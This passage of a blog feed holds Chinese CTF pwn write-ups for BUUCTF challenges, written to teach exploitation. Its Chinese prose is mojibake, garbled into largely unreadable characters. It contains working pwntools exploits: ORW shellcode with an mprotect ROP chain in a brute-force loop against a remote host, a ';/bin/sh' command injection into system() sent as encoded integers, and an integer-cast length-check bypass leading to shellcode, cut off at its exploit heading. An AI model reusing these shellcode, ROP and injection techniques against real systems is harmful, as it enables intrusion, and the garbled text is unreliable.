orw_shellcode=<span class="string">&#x27;\x68\x66\x6C\x61\x67\x54\x5F\x6A\x00\x5E\x6A\x02\x58\x0F\x05\x6A\x01\x5F\x54\x5E\x6A\x50\x5A\x6A\x00\x58\x0F\x05\x6A\x02\x5F\x54\x5E\x6A\x50\x5A\x6A\x01\x58\x0F\x05&#x27;</span></span><br><span class="line">    payload=<span class="string">&#x27;d^3CTF\x00\x00&#x27;</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    payload+=p64(pop_rdi_addr)+p64(base_addr+<span class="number">0x202000</span>)</span><br><span class="line">    payload+=p64(pop_rsi_r15_addr)+p64(<span class="number">0x100000</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    payload+=p64(pop_rdx_addr)+p64(<span class="number">7</span>)</span><br><span class="line">    payload+=p64(mprotect_addr)</span><br><span class="line">    payload+=p64(base_addr+<span class="number">0x60</span>+<span class="number">0x202060</span>+<span class="number">0x8</span>)</span><br><span class="line">    payload+=orw_shellcode</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="comment">#p = process(&#x27;./a&#x27;)</span></span><br><span class="line">    p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25582</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">    leak_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(leak_addr &amp; <span class="number">0xffff</span>))</span><br><span class="line">    <span class="keyword">if</span> leak_addr &amp; <span class="number">0xffff</span> &gt; <span class="number">0x2000</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;---------i------------&#x27;</span>, i)</span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.recvuntil(<span class="string">&quot;may you enjoy my printf test!\n&quot;</span>)</span><br><span class="line">        pwn()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ˜¯æœ¬åœ°å‡ºçš„flag</p><p><img src="/../img/2706180-20220429211252638-1134810034.png" alt="image-20220429204916689"></p>]]></content>
      
      
      <categories>
          
          <category> buuåˆ·é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> orw </tag>
            
            <tag> çˆ†ç ´ </tag>
            
            <tag> æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ </tag>
            
            <tag> magic_gadget </tag>
            
            <tag> æ²™ç®± </tag>
            
            <tag> æ ˆè¿ç§»ï¼Œcloseå…³é—­æ–‡ä»¶æè¿°ç¬¦ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF_bjdctf_2020_dizzy</title>
      <link href="/posts/160e7f7d.html"/>
      <url>/posts/160e7f7d.html</url>
      
        <content type="html"><![CDATA[<h2 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h2><p>é€šè¿‡è¿™é“é¢˜çš„å­¦ä¹ ä¸æ”¶è·æœ‰ï¼š</p><p>1ã€åˆ†æè¿™ç§æ¼æ´æ¯”è¾ƒæ˜æ˜¾çš„é¢˜ç›®ï¼Œåº”è¯¥å€’æ¨ç¨‹åºé€»è¾‘ï¼Œè€Œä¸”ç¨‹åºæœ€åç»™å‡ºäº†system(command)ï¼Œè€Œcommandåˆæ˜¯ä¸ªåœ°å€ï¼ˆæŒ‡å‘æˆ‘ä»¬æ‰€è¾“å…¥çš„å†…å®¹ï¼‰ï¼Œæ­¤æ—¶åº”è¯¥å¾ˆå®¹æ˜“æƒ³åˆ°ï¼Œæˆ‘ä»¬è¾“å…¥&#x2F;bin&#x2F;shå°±å¯ä»¥æ‰§è¡Œã€‚ä½†æ˜¯æˆ‘å¼€å§‹æ²¡æœ‰æƒ³åˆ°è¿™ä¸€ç‚¹â€¦ è¿˜æ˜¯åšçš„å°‘ã€‚</p><p>2ã€è€ƒå¯Ÿäº†linuxä¸‹å‘½ä»¤è¡Œå¤šå‘½ä»¤æ‰§è¡Œçš„ç‰¹å®šã€‚å¦‚æœå‘½ä»¤è¢«;åˆ†å¼€ï¼Œå³ä½¿å‰é¢çš„å‘½ä»¤æ‰§è¡Œé”™è¯¯ä¹Ÿä¾æ—§ä¼šæ‰§è¡Œåé¢çš„å‘½ä»¤ã€‚</p><p>3ã€u32å¯ä»¥ä¸€æ¬¡è½¬å››ä¸ªå­—ç¬¦ä¸ºå¯¹åº”ASCIIç ï¼Œè¿”å›å€¼ä¸ºintç±»å‹ã€‚</p><p>4ã€å½“æ ¼å¼åŒ–å­—ç¬¦ä¸º%dæ—¶ï¼Œæˆ‘ä»¬æƒ³å­˜å…¥å­—ç¬¦ä¸²ï¼Œåº”è¯¥è¾“å…¥å¯¹åº”å…¶ASCIIã€‚</p><p>5ã€è¿™é“é¢˜åˆæ˜¯åœ°å€åˆæ˜¯*åœ°å€çš„ï¼Œå¼€å§‹å®¹æ˜“æè¿·ç³Šï¼Œåº”è¯¥ä»”ç»†æ‹ä¸€ä¸‹ã€‚</p><h2 id="ä¿æŠ¤ç­–ç•¥ï¼š"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h2><p><img src="/../img/2706180-20220414222751499-1552697268.png"></p><h2 id="ç¨‹åºåˆ†æ-amp-amp-å¤§è‡´æ€è·¯ï¼š"><a href="#ç¨‹åºåˆ†æ-amp-amp-å¤§è‡´æ€è·¯ï¼š" class="headerlink" title="ç¨‹åºåˆ†æ&amp;&amp;å¤§è‡´æ€è·¯ï¼š"></a>ç¨‹åºåˆ†æ&amp;&amp;å¤§è‡´æ€è·¯ï¼š</h2><p><img src="/../img/2706180-20220414222803646-96290051.png"></p><p>å€’ç€åˆ†æä¸€ä¸‹ï¼Œå¦‚æœç¨‹åºè¦æ‰§è¡Œsystem(command)å°±ä¸èƒ½è¿›å…¥æœ€åçš„ä¸€ä¸ªifã€‚ä¹Ÿå°±æ˜¯è¯´æœ€åçš„*v8è¦ä¸º0ã€‚å¹¶ä¸”commandè¿˜è¦ä¸º&#x2F;bin&#x2F;shå‚æ•°æˆ–è€…shå‚æ•°ã€‚</p><p><img src="/../img/2706180-20220414222812908-594360044.png"></p><p>è¿™é“é¢˜æœåˆ°äº†shï¼Œç„¶åæ€è·¯å°±å½»åº•è·‘åäº†ã€‚å› ä¸ºæˆ‘ä¸€ç›´åœ¨è€ƒè™‘æ€ä¹ˆå¯¹æŠ—PIEä¿æŠ¤ï¼ˆå› ä¸ºå¼€äº†PIEä¹‹åï¼Œè¿™ä¸ªshåœ°å€æ˜¯æ²¡æ³•ç›´æ¥ç”¨çš„ï¼‰ï¼Œæƒ³å¯¹æŠ—PIEçš„è¯ï¼Œé¦–å…ˆæƒ³åˆ°çš„å°±æ˜¯æ³„éœ²ç¨‹åºæ³„éœ²åŸºåœ°å€ï¼Œä¸è¿‡è¿™é“é¢˜æ‰“å°å‡½æ•°æ˜¯ä¸å¯èƒ½å»æ³„éœ²çš„ï¼ŒåŒæ—¶æˆ‘ä»¬ä¹Ÿæ²¡æ³•æº¢å‡ºï¼Œä¸å¯èƒ½æ§åˆ¶è¿”å›åœ°å€ï¼Œå› æ­¤æ³„éœ²åŸºåœ°å€è¿™ä¸ªæ–¹å‘ç»å¯¹è¡Œä¸é€šã€‚</p><p><em><strong>ï¼ˆè¿™é‡Œå½“æ—¶æƒ³çš„å°±ä¸å¯¹ï¼Œcommandæœ¬èº«å°±æ˜¯ä¸ªåœ°å€ï¼Œè€Œæˆ‘ä»¬è¾“å…¥çš„å†…å®¹æ˜¯å­˜æ”¾åˆ°äº†commandæŒ‡å‘çš„ä½ç½®ï¼Œå› æ­¤ç»™systemçš„commandæœ¬èº«å°±æ˜¯ä¸ªæŒ‡é’ˆäº†ï¼Œæ‰€ä»¥å°±ä¸å¯èƒ½å†å†™shçš„åœ°å€äº†ï¼‰</strong></em></p><p>è¿™é“é¢˜ä¾ç„¶éœ€è¦å€’ç€åˆ†æï¼Œå…ˆçœ‹è¿™ä¸€éƒ¨åˆ†ã€‚</p><p><img src="/../img/2706180-20220414222829571-1571083575.png"></p><p>å› ä¸º*v8æœ€åè‚¯å®šæ˜¯è¦ä¸º0çš„ï¼Œè¿™ä¸ªå®šæ­»äº†ã€‚å¯æ˜¯æˆ‘ä»¬æ˜¯æ§åˆ¶ä¸äº†*v8çš„å€¼ï¼Œä¸è¿‡è¿™é‡Œåˆ†æä¸€ä¸‹è¿™ä¸ªå¾ªç¯ã€‚ä»€ä¹ˆæ—¶å€™*v8å¯ä»¥ä¸º0ï¼Ÿæˆ‘ä»¬å‘ç°æ¯æ¬¡å¾ªç¯v8éƒ½ä¼š++ï¼Œå› æ­¤åªæœ‰å½“*v8æŒ‡å‘å­—ç¬¦ä¸²æœ«å°¾çš„æ—¶å€™ï¼Œå®ƒçš„å€¼æ‰ä¸º0ã€‚å› æ­¤æˆ‘ä»¬è‚¯å®šæ˜¯è¦è®©è¿™ä¸ªforæ‰§è¡Œå®Œæ¯•ã€‚</p><p>å†è§‚å¯Ÿä¸€ä¸‹è¿™ä¸ªforå¾ªç¯æ•´ä½“ï¼Œiå’Œv7æ‹¿åˆ°çš„éƒ½æ˜¯commandï¼ˆè¾“å…¥å†…å®¹æœ€å¼€å§‹çš„åœ°å€ï¼‰ï¼Œæ¯æ¬¡å¾ªç¯å…ˆåˆ¤æ–­*v8æ˜¯å¦ä¸º0ï¼ˆå¦‚æœä¸º0çš„è¯å°±ä¼šè§¦å‘breakç»“æŸæ‰å¾ªç¯ï¼ˆä¸è¿‡æˆ‘ä»¬åˆ†æè¿‡äº†ï¼Œåªæœ‰åœ¨*v8åˆ°è¾¾å­—ç¬¦ä¸²æœ«å°¾çš„æ—¶å€™æ‰ä¼šä¸º0,å› æ­¤è¿™é‡Œä¸ç”¨è€ƒè™‘è¿™ä¸ªbreakï¼‰ï¼‰</p><p>ç¬¬äºŒä¸ªifï¼Œæ¯æ¬¡çš„v7éƒ½ä¸èƒ½å’Œ*v8çš„å€¼ç›¸åŒï¼ˆå¦‚æœç›¸åŒï¼Œå°±ä¼šæå‰breakæ‰å¯¼è‡´*v8ä¸ä¸º0)ï¼Œè€Œv7å°†å¾ªç¯éå†command[0]å¼€å§‹çš„æ¯ä¸€ä¸ªå†…å­˜å•å…ƒï¼Œè€Œæˆ‘ä»¬æ˜¯å¯ä»¥æ§åˆ¶æ¯ä¸ªå†…å­˜å•å…ƒçš„å€¼çš„ï¼Œæ¥ä¸‹æ¥åˆ†æå¦ä¸€ä¸ªéƒ¨åˆ†ã€‚</p><p><img src="/../img/2706180-20220414222839211-1406784564.png"></p><p>v4å’Œv3è¿˜æœ‰v6éƒ½æ˜¯commandã€‚ç„¶åè¾“å…¥çš„å†…å®¹ï¼ˆå¿…é¡»æ˜¯intå‹ï¼Œå¦‚æœæ˜¯charç±»å‹ç¨‹åºå°†ç›´æ¥ç»“æŸï¼‰å°†å­˜æ”¾åˆ°commandä¸­ï¼Œåªè¦v4ä¸æ˜¯command+80å°±ç»§ç»­è¿›è¡Œå¾ªç¯ï¼Œä¹Ÿå°±æ˜¯è¿›è¡Œ20æ¬¡å¾ªç¯ã€‚ç”±äºæ¯æ¬¡v4+4å¹¶ä¸”åˆèµ‹ç»™v6ï¼Œå› æ­¤v6ä¹Ÿåœ¨ç§»åŠ¨ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è¾“å…¥çš„å†…å®¹ä¼šä¾æ¬¡å­˜åˆ°command~command+80çš„ä½ç½®ã€‚</p><p>ç„¶åè¿›å…¥ç¬¬äºŒä¸ªå¾ªç¯ï¼Œè¿™ä¸ªå¾ªç¯å¾ˆç®€å•ï¼Œå°±æ˜¯v3å»ä»commandå¼€å§‹éå†ï¼Œå°†æ¯ä¸ªå†…å­˜å•å…ƒçš„å€¼éƒ½åŠ ä¸Š114514ï¼Œç­‰åˆ°v3ä¸º4100çš„æ—¶å€™ï¼Œå°±å¯ä»¥å‡ºæ¥è¿™ä¸ªå¾ªç¯äº†ï¼ˆv3å°†æœ€åè¶…è¿‡äº†æˆ‘ä»¬å¯æ§åˆ¶çš„command+80,ä¸è¿‡ä»”ç»†æƒ³ä¸€ä¸‹ï¼Œè¿™å¹¶ä¸å½±å“ï¼Œå¯¹ä¹ˆï¼Ÿ</p><h2 id="æ‰§è¡Œsystemæ—¶çš„å°å‘"><a href="#æ‰§è¡Œsystemæ—¶çš„å°å‘" class="headerlink" title="æ‰§è¡Œsystemæ—¶çš„å°å‘"></a>æ‰§è¡Œsystemæ—¶çš„å°å‘</h2><p>è‡³æ­¤é€šè¿‡äº†æ‰€æœ‰çš„æ£€æŸ¥ï¼Œå¯ä»¥æ‰§è¡Œsystem(command)ï¼Œcommandå‰é¢æ˜¯éœ€è¦è¾“å…¥PvvN| 1S S0 GREAT!</p><p>è¿™é‡Œæœ‰ä¸ªå‘<br><img src="/../img/2706180-20220414222849824-873591426.png"><br><img src="/../img/2706180-20220414222858876-343648094.png"></p><p>å†…å®¹åœ¨è¿™é‡Œã€‚</p><p>ç„¶åPvvN| 1S S0 GREAT!çš„åé¢æ˜¯æˆ‘ä»¬è¦è¾“å…¥çš„å‘½ä»¤ï¼Œè¿™é‡Œè€ƒå¯Ÿäº†linuxç³»ç»Ÿå‘½ä»¤è¡Œå¤šå‘½ä»¤æ‰§è¡Œçš„ç‰¹ç‚¹ã€‚</p><blockquote><p> Linux ç³»ç»Ÿå¯ä»¥åœ¨ä¸€ä¸ªå‘½ä»¤è¡Œä¸Šæ‰§è¡Œå¤šä¸ªå‘½ä»¤:<br>     ; â€“å¦‚æœå‘½ä»¤è¢«åˆ†å·(;)æ‰€åˆ†éš”ï¼Œé‚£ä¹ˆå‘½ä»¤ä¼šè¿ç»­çš„æ‰§è¡Œä¸‹å»ï¼Œå°±ç®—æ˜¯é”™è¯¯çš„å‘½ä»¤ä¹Ÿä¼šç»§ç»­æ‰§è¡Œåé¢çš„å‘½ä»¤<br>     &amp;&amp; â€“å¦‚æœå‘½ä»¤è¢« &amp;&amp; æ‰€åˆ†éš”ï¼Œé‚£ä¹ˆå‘½ä»¤ä¹Ÿä¼šä¸€ç›´æ‰§è¡Œä¸‹å»ï¼Œä½†æ˜¯ä¸­é—´æœ‰é”™è¯¯çš„å‘½ä»¤å°±ä¸ä¼šæ‰§è¡Œåé¢çš„å‘½ä»¤ï¼Œæ²¡é”™å°±ç»§ç»­æ‰§è¡Œç›´è‡³å‘½ä»¤æ‰§è¡Œå®Œä¸ºæ­¢<br>     || â€“å¦‚æœå‘½ä»¤è¢«åŒç«–çº¿ || æ‰€åˆ†éš”ï¼Œé‚£ä¹ˆä¸€é‡åˆ°å¯ä»¥æ‰§è¡ŒæˆåŠŸçš„å‘½ä»¤å°±ä¼šåœæ­¢æ‰§è¡Œåé¢çš„å‘½ä»¤ï¼Œè€Œä¸ç®¡åé¢çš„å‘½ä»¤æ˜¯å¦æ­£ç¡®ã€‚å¦‚æœæ‰§è¡Œåˆ°é”™è¯¯çš„å‘½ä»¤å°±æ˜¯ç»§ç»­æ‰§è¡Œåä¸€ä¸ªå‘½ä»¤ï¼Œç›´åˆ°é‡åˆ°æ‰§è¡Œåˆ°æ­£ç¡®çš„å‘½ä»¤æˆ–å‘½ä»¤æ‰§è¡Œå®Œä¸ºæ­¢</p></blockquote><p>æ­¤å¤„è½¬è‡ª<a href="https://blog.csdn.net/weixin_45582916/article/details/122519353">(27æ¡æ¶ˆæ¯) PWN-PRACTICE-CTFSHOW-4_P1umH0çš„åšå®¢-CSDNåšå®¢</a></p><p>å› ä¸ºæˆ‘ä»¬å‰é¢è¾“å…¥çš„å†…å®¹ä¼šè¢«å½“åšå‘½ä»¤æ‰§è¡Œï¼Œå®ƒè‚¯å®šæ˜¯é”™è¯¯çš„ï¼Œå› æ­¤æˆ‘ä»¬ç´§æ¥ç€éœ€è¦ç”¨;æ¥è¿æ¥åé¢çš„å‚æ•°&#x2F;bin&#x2F;shï¼ˆshä¹Ÿæ˜¯å¯ä»¥çš„ï¼‰</p><p><strong>å› ä¸ºæˆ‘ä»¬åªèƒ½è¾“å…¥æ•´æ•°ï¼Œå› æ­¤æˆ‘ä»¬è¾“å…¥æ˜¯ä»¥ASCIIç çš„å½¢å¼å°†å­—ç¬¦è¾“å…¥è¿›å»çš„ã€‚</strong></p><h2 id="EXPï¼š"><a href="#EXPï¼š" class="headerlink" title="EXPï¼š"></a>EXPï¼š</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p=process(&#x27;./a&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27224</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">flag=<span class="string">&quot;PvvN| 1S S0 GREAT!;/bin/sh\x00\x00&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(flag))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    a=i*<span class="number">4</span></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(u32(flag[a:a+<span class="number">4</span>])-<span class="number">114514</span>))<span class="comment">#å› ä¸ºå½“æ—¶*v3åŠ äº†114514,å› æ­¤è¿™é‡Œè¦å‡å»ï¼Œæ‰èƒ½å­˜å…¥æˆ‘ä»¬æƒ³è¦çš„å€¼</span></span><br><span class="line">    <span class="comment">#å› ä¸ºä¸€ä¸ªå†…å­˜å•å…ƒåªèƒ½å­˜å››ä¸ªå­—èŠ‚ï¼Œå› æ­¤ä¸€æ¬¡å‘é€å››ä¸ªå­—èŠ‚è¿‡å»ï¼Œç”¨u32å°†å­—ç¬¦è½¬æ¢æˆå¯¹åº”çš„ASCIIç ï¼ˆu32è¿”å›å€¼ä¸ºintç±»å‹ï¼ŒåŒæ—¶u32æ­£å¥½éœ€è¦å››ä¸ªå‚æ•°ï¼‰</span></span><br><span class="line">    <span class="comment">#è¿™é“é¢˜ä¹Ÿå¯ä»¥ç”¨chræ¥è½¬æ¢ï¼Œä¸è¿‡å°±æ˜¯æ¯”è¾ƒéº»çƒ¦ï¼Œä¹Ÿç®—çŸ¥é“äº†u32çš„æ–°ç”¨æ³•</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../img/2706180-20220414222953526-1719545982.png"></p>]]></content>
      
      
      <categories>
          
          <category> buuåˆ·é¢˜ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF_actf_2019_anotherrepeater</title>
      <link href="/posts/bd5b9d1a.html"/>
      <url>/posts/bd5b9d1a.html</url>
      
        <content type="html"><![CDATA[<h2 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h2><p>é€šè¿‡è¿™é“é¢˜çš„å­¦ä¹ ä¸æ”¶è·æœ‰ï¼š</p><p>1ã€è€ƒå¯Ÿçš„æ•´æ•°æº¢å‡ºå’Œshellcode</p><p>2ã€åˆ†æäº†ä¸€ä¸‹unsigned short intç±»å‹å¼ºè½¬ä¸ºshort intç±»å‹çš„åŸç†</p><h2 id="ä¿æŠ¤ç­–ç•¥ï¼š"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h2><p><img src="/../img/2706180-20220413184747722-1984586467.png"></p><p>å•¥éƒ½æ²¡å¼€ï¼Œé¦–å…ˆè€ƒè™‘shellcode</p><h2 id="ç¨‹åºåˆ†æï¼š"><a href="#ç¨‹åºåˆ†æï¼š" class="headerlink" title="ç¨‹åºåˆ†æï¼š"></a>ç¨‹åºåˆ†æï¼š</h2><p><img src="/../img/2706180-20220413184756960-1238868077.png"></p><p><img src="/../img/2706180-20220413184807822-617007924.png"></p><p>ç¨‹åºä¸»è¦é€»è¾‘å¾ˆç®€å•ï¼Œå…ˆè¾“å…¥ä¸€ä¸ªæ•°å­—ï¼Œåˆ¤æ–­å®ƒæ˜¯å¦å¤§äº1024ï¼Œå¦‚æœå¤§äºçš„è¯åˆ™ç›´æ¥é€€å‡ºã€‚å°äºçš„è¯ï¼Œå°±è®©ä½ è¾“å…¥å­—ç¬¦ï¼Œè¾“å…¥çš„å­—èŠ‚æ•°ä¸ºåˆšæ‰è¾“å…¥çš„æ•°å­—ã€‚è¿™ä¸ªå‡½æ•°ç»“æŸä¹‹åï¼Œå¼€å§‹æ— é™å¾ªç¯å»æ‰§è¡Œputsæ‰“å°åˆšæ‰è¾“å…¥çš„å­—ç¬¦ã€‚</p><h2 id="å¤§è‡´æ€è·¯ï¼š"><a href="#å¤§è‡´æ€è·¯ï¼š" class="headerlink" title="å¤§è‡´æ€è·¯ï¼š"></a>å¤§è‡´æ€è·¯ï¼š</h2><p>é¦–å…ˆç¬¬ä¸€ä¸ªç‚¹æ˜¯printfç»™æˆ‘ä»¬æ³„éœ²äº†ä¸€ä¸ªbufçš„åœ°å€ï¼ˆä¹Ÿå°±æ˜¯æ ˆåœ°å€ï¼‰ï¼Œè¿™é‡Œä¸ç”¨æƒ³ï¼Œè‚¯å®šæ˜¯å¸®åŠ©æˆ‘ä»¬æ‰§è¡Œshellcodeè€Œæ³„éœ²çš„ã€‚</p><p>ç¬¬äºŒä¸ªç‚¹å°±æ˜¯å‘ç°readè¾“å…¥çš„åœ°æ–¹ï¼Œè·ç¦»è¿”å›åœ°å€æœ‰1051ä¸ªå­—èŠ‚ã€‚æˆ‘ä»¬æ­£å¸¸å¯è¾“å…¥çš„1024å­—èŠ‚æ²¡æ³•å»æ§åˆ¶è¿”å›åœ°å€ã€‚</p><p>ç„¶åå¼€å§‹å»è€ƒè™‘æ€ä¹ˆæ§åˆ¶è¿”å›åœ°å€ï¼Œæˆ‘ä»¬åªèƒ½å»æƒ³åŠæ³•ç»•è¿‡å¯¹1024å­—èŠ‚çš„æ£€æŸ¥ã€‚å‘ç°ifè¿™é‡Œç”¨äº†å¼ºè½¬ï¼Œä»”ç»†åˆ†æä¸€ä¸‹è¿™é‡Œã€‚å‘ç°v1åŸæœ¬æ˜¯ä¸ªunsigned shortç±»å‹çš„ï¼Œä½†æ˜¯åœ¨è¿›è¡Œæ£€æŸ¥çš„æ—¶å€™ï¼Œæ˜¯ç”¨__int16å¯¹v1è¿›è¡Œæ“ä½œä¹‹åå†åˆ¤æ–­çš„ã€‚</p><p><img src="/../img/2706180-20220413184816252-1703150849.png"></p><p>æœ¬èº«unsigned __int16å®šä¹‰çš„v1ä¸€å®šæ˜¯ä¸ªæ­£æ•°ï¼Œå¦‚æœè¾“å…¥è´Ÿæ•°çš„è¯ï¼Œå°±ä¼šäº§ç”Ÿå›ç»•ï¼Œè‡ªå·±å˜æˆ65535ã€‚è€Œåœ¨åˆ¤æ–­æ—¶ä»¥__int16ç±»å‹è¿›è¡Œå¼ºè½¬ï¼Œä½¿å¾—&gt;å·¦è¾¹çš„æ•´ä½“å€¼ä¸º-1ï¼Œä»è€Œç»•è¿‡äº†æ£€æŸ¥ã€‚</p><p>ç»•è¿‡æ£€æŸ¥ä¹‹åæ€è·¯å°±ç®€å•å¾ˆå¤šäº†ï¼Œå› ä¸ºæ²¡æœ‰NXï¼Œç›´æ¥å¸ƒç½®shellcodeï¼Œç”±äºæˆ‘ä»¬æ˜¯æ˜¯æœ‰bufçš„æ ˆåœ°å€çš„ï¼Œå› æ­¤æ€è·¯å°±æ˜¯ç›´æ¥å¸ƒç½®shellcodeï¼Œç„¶åå¡«å……åƒåœ¾æ•°æ®åˆ°è¿”å›åœ°å€ï¼ŒæŠŠè¿”å›åœ°å€è£…ä¸€ä¸ªbufçš„æ ˆåœ°å€ï¼ˆæˆ‘ä»¬ä¸æ¯«ä¸ç”¨æ‹…å¿ƒè¾“å…¥å­—èŠ‚æ•°çš„é—®é¢˜ï¼Œæ¯•ç«Ÿæˆ‘ä»¬å¯ä»¥è¾“å…¥65535ä¸ªå­—èŠ‚å‘¢ï¼‰ï¼Œæ­¤å¤–ä¹Ÿä¸éœ€è¦å»æ‹…å¿ƒæœ€åçš„æ— é™å¾ªç¯æ‰§è¡Œputsï¼Œå› ä¸ºæˆ‘ä»¬å†è¿”å›mainå‡½æ•°çš„æ—¶å€™å°±å·²ç»åŠ«æŒäº†ç¨‹åºçš„æ‰§è¡Œæµä½¿å…¶æ‰§è¡Œäº†shellcodeã€‚</p><h2 id="å¼ºè½¬çš„è¿‡ç¨‹"><a href="#å¼ºè½¬çš„è¿‡ç¨‹" class="headerlink" title="å¼ºè½¬çš„è¿‡ç¨‹"></a>å¼ºè½¬çš„è¿‡ç¨‹</h2><p>è¿™é‡Œç®€å•è¯´ä¸€ä¸‹è¿™ä¸ªå¼ºè½¬çš„è¿‡ç¨‹ï¼Œå› ä¸ºæˆ‘æ„Ÿè§‰è¿™ä¸ªç‚¹åº”è¯¥å»ç ”ç©¶ä¸€ä¸‹ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">unsigned</span> __int16 a=<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span>((__int16)a&gt;<span class="number">1024</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%u\n&quot;</span>,a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%u\n&quot;</span>,a);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/../img/2706180-20220413184825767-1374956638.png"></p><p>è¿™ä¸ªåœ°æ–¹ç›´æ¥æ‰“å°äº†65535ï¼Œå°±è¯´æ˜ç»•è¿‡äº†ifçš„æ£€æŸ¥ã€‚ä¸ºä»€ä¹ˆæœ€åaæ˜¯65535ç»è¿‡å¼ºè½¬å°±æ˜¯-1å‘¢ï¼Ÿ</p><p>å› ä¸ºunsignedå°±ä»£è¡¨äº†æ— ç¬¦å·æ•´æ•°ï¼Œä¹Ÿå°±æ˜¯æœ€é«˜ä½çš„0,1ä¾ç„¶è¡¨ç¤ºæ•°å­—æœ¬èº«ã€‚è€Œshort intï¼Œåˆ™ä»£è¡¨æœ‰ç¬¦å·æ•´æ•°ï¼Œå®ƒçš„æœ€é«˜ä½æ˜¯ç¬¦å·ä½ï¼Œåªèƒ½ç”¨æ¥è¡¨ç¤ºæ­£è´Ÿ(1è´Ÿï¼Œ0æ­£)ã€‚<strong>æ— ç¬¦å·æ•´æ•°è½¬æœ‰ç¬¦å·æ•´æ•°æ—¶ï¼Œå¦‚æœæœ€é«˜ä½ä¸º0ï¼Œåˆ™ç¬¦å·æ•°ç­‰äºæ— ç¬¦å·æ•°ã€‚å¦‚æœæœ€é«˜ä½ä¸º1ï¼Œåˆ™å°†é™¤å»æœ€é«˜ä½ä¹‹å¤–å‰©ä¸‹çš„æ‰€æœ‰ä½å–åå†åŠ 1ï¼Œå¾—åˆ°çš„å°±æ˜¯æœ‰ç¬¦å·æ•°ï¼ˆè¿™æ­¥å…¶å®ä¹Ÿå°±æ˜¯å–è¡¥ç ï¼‰</strong> è½¬æ¢å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">65535</span> unsigned short <span class="built_in">int</span></span><br><span class="line"><span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span></span><br><span class="line"></span><br><span class="line">-<span class="number">1</span>    short <span class="built_in">int</span></span><br><span class="line"><span class="number">1000</span> <span class="number">0000</span> <span class="number">0000</span> 0001</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥åœ¨ifæ£€æŸ¥çš„æ—¶å€™ï¼Œå¼ºè½¬å¾—åˆ°çš„-1ç»•è¿‡äº†æ£€æŸ¥ï¼Œä½†äº‹å®ä¸Šv1ä¸€ç›´éƒ½æ˜¯65535ï¼ˆå› ä¸ºå®ƒæ˜¯unsigned short intç±»å‹ï¼‰</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h2><figure class="highlight 